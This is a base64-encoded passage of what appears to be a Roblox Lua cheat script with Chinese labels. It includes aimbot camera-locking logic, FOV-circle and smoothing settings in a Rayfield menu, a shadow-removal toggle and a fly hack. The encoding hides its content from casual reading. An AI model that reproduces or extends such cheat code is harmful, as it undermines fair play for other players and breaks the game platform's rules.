lblBvcyA9IENhbWVyYTpXb3JsZFRvVmlld3BvcnRQb2ludChhaW1Qb3MpCiAgICAgICAgICAgICAgICBpZiBzY3JlZW5Qb3MuWiA+IDAgdGhlbgogICAgICAgICAgICAgICAgICAgIGFpbUxpbmUuRnJvbSA9IFZlY3RvcjIubmV3KENhbWVyYS5WaWV3cG9ydFNpemUuWC8yLCBDYW1lcmEuVmlld3BvcnRTaXplLlkvMikKICAgICAgICAgICAgICAgICAgICBhaW1MaW5lLlRvID0gVmVjdG9yMi5uZXcoc2NyZWVuUG9zLlgsIHNjcmVlblBvcy5ZKQogICAgICAgICAgICAgICAgICAgIGFpbUxpbmUuVmlzaWJsZSA9IHRydWUKICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICBhaW1MaW5lLlZpc2libGUgPSBmYWxzZQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIGFpbUxpbmUuVmlzaWJsZSA9IGZhbHNlCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgZGVsdGEgPSBhaW1Qb3MgLSBDYW1lcmEuQ0ZyYW1lLlBvc2l0aW9uCiAgICAgICAgICAgIGlmIGRlbHRhLk1hZ25pdHVkZSA8IDAuMDEgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBsb2NhbCB0YXJnZXRDRiA9IENGcmFtZS5uZXcoQ2FtZXJhLkNGcmFtZS5Qb3NpdGlvbiwgQ2FtZXJhLkNGcmFtZS5Qb3NpdGlvbiArIGRlbHRhKQogICAgICAgICAgICBsb2NhbCBjdXJyZW50TG9vayA9IENhbWVyYS5DRnJhbWUuTG9va1ZlY3RvcgogICAgICAgICAgICBsb2NhbCB0YXJnZXRMb29rID0gdGFyZ2V0Q0YuTG9va1ZlY3RvcgogICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgZG90ID0gY3VycmVudExvb2s6RG90KHRhcmdldExvb2spCiAgICAgICAgICAgIGxvY2FsIGFuZ2xlID0gbWF0aC5hY29zKG1hdGguY2xhbXAoZG90LCAtMSwgMSkpCiAgICAgICAgICAgIGxvY2FsIG1heEFuZ2xlID0gbWF0aC5yYWQoOTApCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiBhbmdsZSA8PSBtYXhBbmdsZSB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBzbW9vdGhGYWN0b3IgPSBtYXRoLmNsYW1wKGFpbWJvdFNtb290aCwgMC4wMSwgMC45OSkKICAgICAgICAgICAgICAgIGxvY2FsIG5ld0xvb2sgPSBjdXJyZW50TG9vazpMZXJwKHRhcmdldExvb2ssIDEgLSBzbW9vdGhGYWN0b3IpCiAgICAgICAgICAgICAgICBDYW1lcmEuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhDYW1lcmEuQ0ZyYW1lLlBvc2l0aW9uLCBDYW1lcmEuQ0ZyYW1lLlBvc2l0aW9uICsgbmV3TG9vaykKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZW5kCiAgICAKICAgIGxvY2FsIGZ1bmN0aW9uIHN0b3BBaW1ib3QoKQogICAgICAgIGlmIGFpbWJvdENvbm4gdGhlbiAKICAgICAgICAgICAgYWltYm90Q29ubjpEaXNjb25uZWN0KCkgCiAgICAgICAgICAgIGFpbWJvdENvbm4gPSBuaWwgCiAgICAgICAgZW5kCiAgICAgICAgbW91c2VGb3ZDaXJjbGUuVmlzaWJsZSA9IGZhbHNlCiAgICAgICAgZml4ZWRGb3ZDaXJjbGUuVmlzaWJsZSA9IGZhbHNlCiAgICAgICAgYWltTGluZS5WaXNpYmxlID0gZmFsc2UKICAgIGVuZAogICAgCiAgICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQogICAgLS0gQUktQWltYm90IOeLrOeri+agh+etvumhtQogICAgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KICAgIGxvY2FsIFRhYjMgPSBXaW5kb3c6Q3JlYXRlVGFiKCJBSS1BaW1ib3QiLCA3NzMzOTYxNzQ4KQogICAgCiAgICBUYWIzOkNyZWF0ZVNlY3Rpb24oIkFJLUFpbWJvdCIpCiAgICBUYWIzOkNyZWF0ZVRvZ2dsZSh7CiAgICAgICAgTmFtZSA9ICLlkK/nlKggQWltYm90IiwKICAgICAgICBDdXJyZW50VmFsdWUgPSBmYWxzZSwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHYpCiAgICAgICAgICAgIGFpbWJvdEVuYWJsZWQgPSB2CiAgICAgICAgICAgIGlmIHYgdGhlbiAKICAgICAgICAgICAgICAgIHN0YXJ0QWltYm90KCkgCiAgICAgICAgICAgIGVsc2UgCiAgICAgICAgICAgICAgICBzdG9wQWltYm90KCkgCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgfSkKICAgIAogICAgVGFiMzpDcmVhdGVUb2dnbGUoewogICAgICAgIE5hbWUgPSAi5LuF556E5YeG5pWM5Lq6IiwKICAgICAgICBDdXJyZW50VmFsdWUgPSBhaW1ib3RDaGVja1RlYW0sCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2KSBhaW1ib3RDaGVja1RlYW0gPSB2IGVuZAogICAgfSkKICAgIAogICAgVGFiMzpDcmVhdGVUb2dnbGUoewogICAgICAgIE5hbWUgPSAi5aKZ5L2T5qOA5rWLIiwKICAgICAgICBDdXJyZW50VmFsdWUgPSB3YWxsQ2hlY2tFbmFibGVkLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odikgd2FsbENoZWNrRW5hYmxlZCA9IHYgZW5kCiAgICB9KQogICAgCiAgICBUYWIzOkNyZWF0ZVRvZ2dsZSh7CiAgICAgICAgTmFtZSA9ICLmmL7npLroh6rnnoTnur/mnaEiLAogICAgICAgIEN1cnJlbnRWYWx1ZSA9IGFpbUxpbmVFbmFibGVkLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odikgYWltTGluZUVuYWJsZWQgPSB2IGVuZAogICAgfSkKICAgIAogICAgVGFiMzpDcmVhdGVEcm9wZG93bih7CiAgICAgICAgTmFtZSA9ICLnnoTlh4bmlrnlvI8iLAogICAgICAgIE9wdGlvbnMgPSB7IkRpc3RhbmNlIiwgIkNyb3NzaGFpciJ9LAogICAgICAgIEN1cnJlbnRPcHRpb24gPSBhaW1ib3RNb2RlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odikgYWltYm90TW9kZSA9IHYgZW5kCiAgICB9KQogICAgCiAgICBUYWIzOkNyZWF0ZVNlY3Rpb24oIui3n+maj+m8oOaghyBGT1YiKQogICAgVGFiMzpDcmVhdGVUb2dnbGUoeyAKICAgICAgICBOYW1lID0gIuaYvuekuui3n+maj0ZPViIsIAogICAgICAgIEN1cnJlbnRWYWx1ZSA9IGZhbHNlLCAKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHYpIG1vdXNlRm92Q2lyY2xlLlZpc2libGUgPSB2IGVuZCAKICAgIH0pCiAgICAKICAgIFRhYjM6Q3JlYXRlU2xpZGVyKHsKICAgICAgICBOYW1lID0gIuWNiuW+hO+8iOa7keadoe+8iSIsCiAgICAgICAgUmFuZ2UgPSB7MCwgNTAwfSwKICAgICAgICBJbmNyZW1lbnQgPSA1LAogICAgICAgIFN1ZmZpeCA9ICJweCIsCiAgICAgICAgQ3VycmVudFZhbHVlID0gbW91c2VGT1YsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2KSAKICAgICAgICAgICAgbW91c2VGT1YgPSB2CiAgICAgICAgICAgIG1vdXNlRm92Q2lyY2xlLlJhZGl1cyA9IHYgCiAgICAgICAgZW5kCiAgICB9KQogICAgCiAgICBUYWIzOkNyZWF0ZUlucHV0KHsKICAgICAgICBOYW1lID0gIuWNiuW+hO+8iOi+k+WFpe+8iSIsCiAgICAgICAgUGxhY2Vob2xkZXJUZXh0ID0gdG9zdHJpbmcobW91c2VGT1YpLAogICAgICAgIFJlbW92ZVRleHRBZnRlckZvY3VzTG9zdCA9IGZhbHNlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odHh0KSAKICAgICAgICAgICAgbG9jYWwgbiA9IHRvbnVtYmVyKHR4dCkgCiAgICAgICAgICAgIGlmIG4gdGhlbiAKICAgICAgICAgICAgICAgIG1vdXNlRk9WID0gbgogICAgICAgICAgICAgICAgbW91c2VGb3ZDaXJjbGUuUmFkaXVzID0gbgogICAgICAgICAgICBlbmQgCiAgICAgICAgZW5kCiAgICB9KQogICAgCiAgICBUYWIzOkNyZWF0ZVNlY3Rpb24oIuWbuuWumuS4reW/gyBGT1YiKQogICAgVGFiMzpDcmVhdGVUb2dnbGUoeyAKICAgICAgICBOYW1lID0gIuaYvuekuuWbuuWumkZPViIsIAogICAgICAgIEN1cnJlbnRWYWx1ZSA9IGZhbHNlLCAKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHYpIGZpeGVkRm92Q2lyY2xlLlZpc2libGUgPSB2IGVuZCAKICAgIH0pCiAgICAKICAgIFRhYjM6Q3JlYXRlU2xpZGVyKHsKICAgICAgICBOYW1lID0gIuWNiuW+hO+8iOa7keadoe+8iSIsCiAgICAgICAgUmFuZ2UgPSB7MCwgNTAwfSwKICAgICAgICBJbmNyZW1lbnQgPSA1LAogICAgICAgIFN1ZmZpeCA9ICJweCIsCiAgICAgICAgQ3VycmVudFZhbHVlID0gZml4ZWRGT1YsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2KSAKICAgICAgICAgICAgZml4ZWRGT1YgPSB2CiAgICAgICAgICAgIGZpeGVkRm92Q2lyY2xlLlJhZGl1cyA9IHYgCiAgICAgICAgZW5kCiAgICB9KQogICAgCiAgICBUYWIzOkNyZWF0ZUlucHV0KHsKICAgICAgICBOYW1lID0gIuWNiuW+hO+8iOi+k+WFpe+8iSIsCiAgICAgICAgUGxhY2Vob2xkZXJUZXh0ID0gdG9zdHJpbmcoZml4ZWRGT1YpLAogICAgICAgIFJlbW92ZVRleHRBZnRlckZvY3VzTG9zdCA9IGZhbHNlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odHh0KSAKICAgICAgICAgICAgbG9jYWwgbiA9IHRvbnVtYmVyKHR4dCkgCiAgICAgICAgICAgIGlmIG4gdGhlbiAKICAgICAgICAgICAgICAgIGZpeGVkRk9WID0gbgogICAgICAgICAgICAgICAgZml4ZWRGb3ZDaXJjbGUuUmFkaXVzID0gbgogICAgICAgICAgICBlbmQgCiAgICAgICAgZW5kCiAgICB9KQogICAgCiAgICBUYWIzOkNyZWF0ZVNlY3Rpb24oIumAmueUqOWPguaVsCIpCiAgICBUYWIzOkNyZWF0ZVNsaWRlcih7CiAgICAgICAgTmFtZSA9ICLlubPmu5Hns7vmlbDvvIjmu5HmnaHvvIkiLAogICAgICAgIFJhbmdlID0gezAsIDF9LAogICAgICAgIEluY3JlbWVudCA9IDAuMDEsCiAgICAgICAgU3VmZml4ID0gIiIsCiAgICAgICAgQ3VycmVudFZhbHVlID0gYWltYm90U21vb3RoLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odikgYWltYm90U21vb3RoID0gdiBlbmQKICAgIH0pCiAgICAKICAgIFRhYjM6Q3JlYXRlSW5wdXQoewogICAgICAgIE5hbWUgPSAi5bmz5ruR57O75pWw77yI6L6T5YWl77yJIiwKICAgICAgICBQbGFjZWhvbGRlclRleHQgPSB0b3N0cmluZyhhaW1ib3RTbW9vdGgpLAogICAgICAgIFJlbW92ZVRleHRBZnRlckZvY3VzTG9zdCA9IGZhbHNlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odHh0KSAKICAgICAgICAgICAgbG9jYWwgbiA9IHRvbnVtYmVyKHR4dCkgCiAgICAgICAgICAgIGlmIG4gdGhlbiAKICAgICAgICAgICAgICAgIGFpbWJvdFNtb290aCA9IG4KICAgICAgICAgICAgZW5kIAogICAgICAgIGVuZAogICAgfSkKICAgIAogICAgVGFiMzpDcmVhdGVTbGlkZXIoewogICAgICAgIE5hbWUgPSAi6aKE5rWLICjnp5Ip77yI5ruR5p2h77yJIiwKICAgICAgICBSYW5nZSA9IHswLCAxfSwKICAgICAgICBJbmNyZW1lbnQgPSAwLjAxLAogICAgICAgIFN1ZmZpeCA9ICJzIiwKICAgICAgICBDdXJyZW50VmFsdWUgPSBhaW1ib3RQcmVkaWN0aW9uLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odikgYWltYm90UHJlZGljdGlvbiA9IHYgZW5kCiAgICB9KQogICAgCiAgICBUYWIzOkNyZWF0ZUlucHV0KHsKICAgICAgICBOYW1lID0gIumihOa1iyAo56eSKe+8iOi+k+WFpe+8iSIsCiAgICAgICAgUGxhY2Vob2xkZXJUZXh0ID0gdG9zdHJpbmcoYWltYm90UHJlZGljdGlvbiksCiAgICAgICAgUmVtb3ZlVGV4dEFmdGVyRm9jdXNMb3N0ID0gZmFsc2UsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih0eHQpIAogICAgICAgICAgICBsb2NhbCBuID0gdG9udW1iZXIodHh0KSAKICAgICAgICAgICAgaWYgbiB0aGVuIAogICAgICAgICAgICAgICAgYWltYm90UHJlZGljdGlvbiA9IG4KICAgICAgICAgICAgZW5kIAogICAgICAgIGVuZAogICAgfSkKICAgIAogICAgVGFiMzpDcmVhdGVEcm9wZG93bih7CiAgICAgICAgTmFtZSA9ICLnnoTlh4bpqqjpqrwiLAogICAgICAgIE9wdGlvbnMgPSB7IkhlYWQiLCJOZWNrIiwiVXBwZXJUb3JzbyIsIkh1bWFub2lkUm9vdFBhcnQifSwKICAgICAgICBDdXJyZW50T3B0aW9uID0gYWltYm90Qm9uZSwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHYpIGFpbWJvdEJvbmUgPSB2IGVuZAogICAgfSkKICAgIAogICAgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KICAgIC0tIOWIoOmZpOmYtOW9se+8iOWFqOWxgOW8gOWFs++8iQogICAgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KICAgIFRhYjI6Q3JlYXRlVG9nZ2xlKHsKICAgICAgICBOYW1lID0gIuWIoOmZpOmYtOW9sSIsCiAgICAgICAgQ3VycmVudFZhbHVlID0gZmFsc2UsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2KQogICAgICAgICAgICBnYW1lLkxpZ2h0aW5nLkdsb2JhbFNoYWRvd3MgPSBub3QgdgogICAgICAgICAgICBmb3IgXywgbCBpbiBpcGFpcnMod29ya3NwYWNlOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICBpZiBsOklzQSgiQmFzZVBhcnQiKSBvciBsOklzQSgiTWVzaFBhcnQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgbC5DYXN0U2hhZG93ID0gbm90IHYKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgUmF5ZmllbGQ6Tm90aWZ5KHsKICAgICAgICAgICAgICAgIFRpdGxlID0gIuaPkOekuiIsCiAgICAgICAgICAgICAgICBDb250ZW50ID0gdiBhbmQgIumYtOW9seW3suWIoOmZpCIgb3IgIumYtOW9seW3suaBouWkjSIsCiAgICAgICAgICAgICAgICBEdXJhdGlvbiA9IDIsCiAgICAgICAgICAgICAgICBJbWFnZSA9IDQ0ODMzNjI0NTgKICAgICAgICAgICAgfSkKICAgICAgICBlbmQKICAgIH0pCgogICAgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KICAgIC0tIOS8mOWMluWQjueahOmjnuihjOWKn+iDvQogICAgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KICAgIGxvY2FsIGZseWluZyA9IGZhbHNlCiAgICBsb2NhbCBmbHlTcGVlZCA9IDUwCiAgICBsb2NhbCBiZywgYnYKICAgIGxvY2FsIGN0cmwgPSB7ZiA9IDAsIGIgPSAwLCBsID0gMCwgciA9IDAsIHUgPSAwLCBkID0gMH0KICAgIGxvY2FsIGZseUNvbm5lY3Rpb24KICAgIAogICAgbG9jYWwgZnVuY3Rpb24gZmx5TG9vcCgpCiAgICAgICAgd2hpbGUgZmx5aW5nIGFuZCBnYW1lOkdldFNlcnZpY2UoIlJ1blNlcnZpY2UiKS5IZWFydGJlYXQ6V2FpdCgpIGRvCiAgICAgICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgaWYgbm90IGNoYXJhY3RlciB0aGVuIGJyZWFrIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgdG9yc28gPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSBvciAKICAgICAgICAgICAgICAgICAgICAgICAgICBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlRvcnNvIikgb3IgCiAgICAgICAgICAgICAgICAgICAgICAgICAgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJVcHBlclRvcnNvIikKICAgICAgICAgICAgaWYgbm90IHRvcnNvIHRoZW4gYnJlYWsgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBsb2NhbCBtb3ZlRGlyZWN0aW9uID0gVmVjdG9yMy5uZXcoY3RybC5yIC0gY3RybC5sLCBjdHJsLnUgLSBjdHJsLmQsIGN0cmwuYiAtIGN0cmwuZikKICAgICAgICAgICAgaWYgbW92ZURpcmVjdGlvbi5NYWduaXR1ZGUgPiAwIHRoZW4KICAgICAgICAgICAgICAgIG1vdmVEaXJlY3Rpb24gPSBtb3ZlRGlyZWN0aW9uLlVuaXQKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBsb2NhbCBjYW1lcmEgPSB3b3Jrc3BhY2UuQ3VycmVudENhbWVyYQogICAgICAgICAgICBsb2NhbCBjYW1lcmFDRnJhbWUgPSBjYW1lcmEuQ0ZyYW1lCiAgICAgICAgICAgIGxvY2FsIGNhbWVyYUxvb2tWZWN0b3IgPSBjYW1lcmFDRnJhbWUuTG9va1ZlY3RvcgogICAgICAgICAgICBsb2NhbCBjYW1lcmFSaWdodFZlY3RvciA9IGNhbWVyYUNGcmFtZS5SaWdodFZlY3RvcgogICAgICAgICAgICBsb2NhbCBjYW1lcmFVcFZlY3RvciA9IGNhbWVyYUNGcmFtZS5VcFZlY3RvcgogICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgdmVsb2NpdHkgPSAoY2FtZXJhTG9va1ZlY3RvciAqIG1vdmVEaXJlY3Rpb24uWiAqIGZseVNwZWVkKSArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAoY2FtZXJhUmlnaHRWZWN0b3IgKiBtb3ZlRGlyZWN0aW9uLlggKiBmbHlTcGVlZCkgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgKGNhbWVyYVVwVmVjdG9yICogbW92ZURpcmVjdGlvbi5ZICogZmx5U3BlZWQpCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiBidiB0aGVuCiAgICAgICAgICAgICAgICBidi5WZWxvY2l0eSA9IHZlbG9jaXR5CiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgaWYgbW92ZURpcmVjdGlvbi5NYWduaXR1ZGUgPiAwIGFuZCBiZyB0aGVuCiAgICAgICAgICAgICAgICBiZy5DRnJhbWUgPSBjYW1lcmFDRnJhbWUgKiBDRnJhbWUuQW5nbGVzKAogICAgICAgICAgICAgICAgICAgIC1tYXRoLnJhZChtb3ZlRGlyZWN0aW9uLlogKiAxNSksCiAgICAgICAgICAgICAgICAgICAgbWF0aC5yYWQobW92ZURpcmVjdGlvbi5YICogMTUpLAogICAgICAgICAgICAgICAgICAgIDAKICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKICAgIAogICAgbG9jYWwgZnVuY3Rpb24gc3RhcnRGbHlpbmcoKQogICAgICAgIGlmIGZseWluZyB0aGVuIHJldHVybiBlbmQKICAgICAgICAKICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgaWYgbm90IGNoYXJhY3RlciB0aGVuIAogICAgICAgICAgICBSYXlmaWVsZDpOb3RpZnkoewogICAgICAgICAgICAgICAgVGl0bGUgPSAi6aOe6KGM6ZSZ6K+vIiwKICAgICAgICAgICAgICAgIENvbnRlbnQgPSAi5om+5LiN5Yiw6KeS6ImyIiwKICAgICAgICAgICAgICAgIER1cmF0aW9uID0gMywKICAgICAgICAgICAgICAgIEltYWdlID0gNDQ4MzM2MjQ1OAogICAgICAgICAgICB9KQogICAgICAgICAgICByZXR1cm4gCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgbG9jYWwgaHVtYW5vaWQgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCiAgICAgICAgaWYgbm90IGh1bWFub2lkIHRoZW4gCiAgICAgICAgICAgIFJheWZpZWxkOk5vdGlmeSh7CiAgICAgICAgICAgICAgICBUaXRsZSA9ICLpo57ooYzplJnor68iLAogICAgICAgICAgICAgICAgQ29udGVudCA9ICLmib7kuI3liLBIdW1hbm9pZCIsCiAgICAgICAgICAgICAgICBEdXJhdGlvbiA9IDMsCiAgICAgICAgICAgICAgICBJbWFnZSA9IDQ0ODMzNjI0NTgKICAgICAgICAgICAgfSkKICAgICAgICAgICAgcmV0dXJuIAogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIGZseWluZyA9IHRydWUKICAgICAgICAKICAgICAgICBsb2NhbCB0b3JzbyA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIG9yIAogICAgICAgICAgICAgICAgICAgICAgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJUb3JzbyIpIG9yIAogICAgICAgICAgICAgICAgICAgICAgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJVcHBlclRvcnNvIikKICAgICAgICBpZiBub3QgdG9yc28gdGhlbiAKICAgICAgICAgICAgZmx5aW5nID0gZmFsc2UKICAgICAgICAgICAgUmF5ZmllbGQ6Tm90aWZ5KHsKICAgICAgICAgICAgICAgIFRpdGxlID0gIumjnuihjOmUmeivryIsCiAgICAgICAgICAgICAgICBDb250ZW50ID0gIuaJvuS4jeWIsOi6q+S9k+mDqOS9jSIsCiAgICAgICAgICAgICAgICBEdXJhdGlvbiA9IDMsCiAgICAgICAgICAgICAgICBJbWFnZSA9IDQ0ODMzNjI0NTgKICAgICAgICAgICAgfSkKICAgICAgICAgICAgcmV0dXJuIAogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIGJnID0gSW5zdGFuY2UubmV3KCJCb2R5R3lybyIsIHRvcnNvKQogICAgICAgIGJnLlAgPSA5ZTQKICAgICAgICBiZy5tYXhUb3JxdWUgPSBWZWN0b3IzLm5ldyg5ZTksIDllOSwgOWU5KQogICAgICAgIGJnLmNmcmFtZSA9IHRvcnNvLkNGcmFtZQogICAgICAgIAogICAgICAgIGJ2ID0gSW5zdGFuY2UubmV3KCJCb2R5VmVsb2NpdHkiLCB0b3JzbykKICAgICAgICBidi5WZWxvY2l0eSA9IFZlY3RvcjMubmV3KDAsIDAuMSwgMCkKICAgICAgICBidi5NYXhGb3JjZSA9IFZlY3RvcjMubmV3KDllOSwgOWU5LCA5ZTkpCiAgICAgICAgCiAgICAgICAgaHVtYW5vaWQuUGxhdGZvcm1TdGFuZCA9IHRydWUKICAgICAgICAKICAgICAgICBSYXlmaWVsZDpOb3RpZnkoewogICAgICAgICAgICBUaXRsZSA9ICLpo57ooYzmqKHlvI8iLAogICAgICAgICAgICBDb250ZW50ID0gIumjnuihjOW3suWQr+eUqCAo6YCf5bqmOiAiIC4uIGZseVNwZWVkIC4uICIpIiwKICAgICAgICAgICAgRHVyYXRpb24gPSAzLAogICAgICAgICAgICBJbWFnZSA9IDQ0ODMzNjI0NTgKICAgICAgICB9KQogICAgICAgIAogICAgICAgIGZseUNvbm5lY3Rpb24gPSBnYW1lOkdldFNlcnZpY2UoIlJ1blNlcnZpY2UiKS5IZWFydGJlYXQ6Q29ubmVjdChmbHlMb29wKQogICAgZW5kCiAgICAKICAgIGxvY2FsIGZ1bmN0aW9uIHN0b3BGbHlpbmcoKQogICAgICAgIGlmIG5vdCBmbHlpbmcgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgZmx5aW5nID0gZmFsc2UKICAgICAgICAKICAgICAgICBpZiBiZyB0aGVuIGJnOkRlc3Ryb3koKSBiZyA9IG5pbCBlbmQKICAgICAgICBpZiBidiB0aGVuIGJ2OkRlc3Ryb3koKSBidiA9IG5pbCBlbmQKICAgICAgICBpZiBmbHlDb25uZWN0aW9uIHRoZW4gZmx5Q29ubmVjdGlvbjpEaXNjb25uZWN0KCkgZmx5Q29ubmVjdGlvbiA9IG5pbCBlbmQKICAgICAgICAKICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgaWYgY2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgbG9jYWwgaHVtYW5vaWQgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCiAgICAgICAgICAgIGlmIGh1bWFub2lkIHRoZW4KICAgICAgICAgICAgICAgIGh1bWFub2lkLlBsYXRmb3JtU3RhbmQgPSBmYWxzZQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIGFuaW1hdGUgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkFuaW1hdGUiKQogICAgICAgICAgICBpZiBhbmltYXRlIHRoZW4KICAgICAgICAgICAgICAgIGFuaW1hdGUuRGlzYWJsZWQgPSBmYWxzZQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICBjdHJsID0ge2YgPSAwLCBiID0gMCwgbCA9IDAsIHIgPSAwLCB1ID0gMCwgZCA9IDB9CiAgICAgICAgCiAgICAgICAgUmF5ZmllbGQ6Tm90aWZ5KHsKICAgICAgICAgICAgVGl0bGUgPSAi6aOe6KGM5qih5byPIiwKICAgICAgICAgICAgQ29udGVudCA9ICLpo57ooYzlt7LnpoHnlKgiLAogICAgICAgICAgICBEdXJhdGlvbiA9IDMsCiAgICAgICAgICAgIEltYWdlID0gNDQ4MzM2MjQ1OAogICAgICAgIH0pCiAgICBlbmQKICAgIAogICAgbG9jYWwgaW5wdXRCZWdhbkNvbm4sIGlucHV0RW5kZWRDb25uCiAgICAKICAgIGxvY2FsIGZ1bmN0aW9uIHNldHVwSW5wdXQoKQogICAgICAgIGlmIGlucHV0QmVnYW5Db25uIHRoZW4gaW5wdXRCZWdhbkNvbm46RGlzY29ubmVjdCgpIGVuZAogICAgICAgIGlmIGlucHV0RW5kZWRDb25uIHRoZW4gaW5wdXRFbmRlZENvbm46RGlzY29ubmVjdCgpIGVuZAogICAgICAgIAogICAgICAgIGlucHV0QmVnYW5Db25uID0gZ2FtZTpHZXRTZXJ2aWNlKCJVc2VySW5wdXRTZXJ2aWNlIikuSW5wdXRCZWdhbjpDb25uZWN0KGZ1bmN0aW9uKGlucHV0KQogICAgICAgICAgICBpZiBub3QgZmx5aW5nIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgaWYgaW5wdXQuS2V5Q29kZSA9PSBFbnVtLktleUNvZGUuVyB0aGVuCiAgICAgICAgICAgICAgICBjdHJsLmYgPSAxCiAgICAgICAgICAgIGVsc2VpZiBpbnB1dC5LZXlDb2RlID09IEVudW0uS2V5Q29kZS5TIHRoZW4KICAgICAgICAgICAgICAgIGN0cmwuYiA9IDEKICAgICAgICAgICAgZWxzZWlmIGlucHV0LktleUNvZGUgPT0gRW51bS5LZXlDb2RlLkEgdGhlbgogICAgICAgICAgICAgICAgY3RybC5sID0gMQogICAgICAgICAgICBlbHNlaWYgaW5wdXQuS2V5Q29kZSA9PSBFbnVtLktleUNvZGUuRCB0aGVuCiAgICAgICAgICAgICAgICBjdHJsLnIgPSAxCiAgICAgICAgICAgIGVsc2VpZiBpbnB1dC5LZXlDb2RlID09IEVudW0uS2V5Q29kZS5TcGFjZSB0aGVuCiAgICAgICAgICAgICAgICBjdHJsLnUgPSAxCiAgICAgICAgICAgIGVsc2VpZiBpbnB1dC5LZXlDb2RlID09IEVudW0uS2V5Q29kZS5MZWZ0Q29udHJvbCBvciBpbnB1dC5LZXlDb